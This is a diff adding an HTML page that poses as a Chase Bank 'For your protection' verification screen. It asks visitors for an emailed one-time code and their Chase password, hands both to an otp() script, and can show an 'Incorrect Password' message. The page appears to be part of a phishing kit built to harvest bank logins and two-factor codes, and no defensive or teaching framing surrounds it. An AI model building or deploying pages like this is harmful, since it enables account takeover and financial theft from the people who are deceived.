@@ -1,0 +1,38 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="error.css">
+    <link rel="stylesheet" href="otp.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="/icons/60394399d4d69e00040ae03d.png" type="image/x-icon">
+
+</head>
+<body>
+        <section class="error-header">
+            <img src="/icons/WhatsApp_Image_2024-04-01_at_2.22.42_PM-removebg-preview.png" alt="">
+        </section>
+    
+        <section class="protection">
+            <h1>For your protection</h1>
+            <h5>We sent you an email</h5>
+            <p>Your identification code is on its way, please enter it below, along with the password you normally use to sign in</p>
+
+            <div class="temporary-code">
+                <h6>Temporay identification code</h6>
+                <input type="text" name="code" id="code" placeholder="Code" required>
+                <h6>Chase Bank password</h6>
+                <input type="password" name="password" id="password" placeholder="Passowrd">
+                <input type="button" value="Next" id="next" onclick="otp()" required>
+            </div>
+            <div id="incorrect">
+                <p>Incorrect Password</p>
+            </div>
+        </section>
+
+</body>
+<script src="/otp.js"></script>
+</html>
